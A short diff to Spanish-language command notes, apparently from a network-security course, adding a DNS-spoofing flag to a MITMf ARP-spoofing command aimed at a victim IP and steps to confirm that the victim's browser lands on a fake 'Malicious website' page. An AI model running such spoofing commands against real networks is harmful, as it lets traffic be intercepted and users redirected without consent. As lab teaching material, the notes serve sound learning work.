@@ -552,7 +552,12 @@ rmdir <nombre directorio> (Borrar directorio)
 --- nano index.html (Crea un archivo html)
 --- Editar el html con algún mensaje, ejemplo <h1> Malicious website </h1>
 --- Ctrl + G para guardar y Ctrl + X para salir 
---- mitmf --arp --spoof --gateway <router_gateway> --target <ip_victima> -i <interface_ejemplo_eth0>
+--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_victima> -i <interface_ejemplo_eth0> --dns
+--- Ir a la pc de la víctima y navegar al dominio ejemplo: tutorial.com
+--- Si todo está bien se debe mostrar el texto indicado en el .html
+
+
+
 
 
 
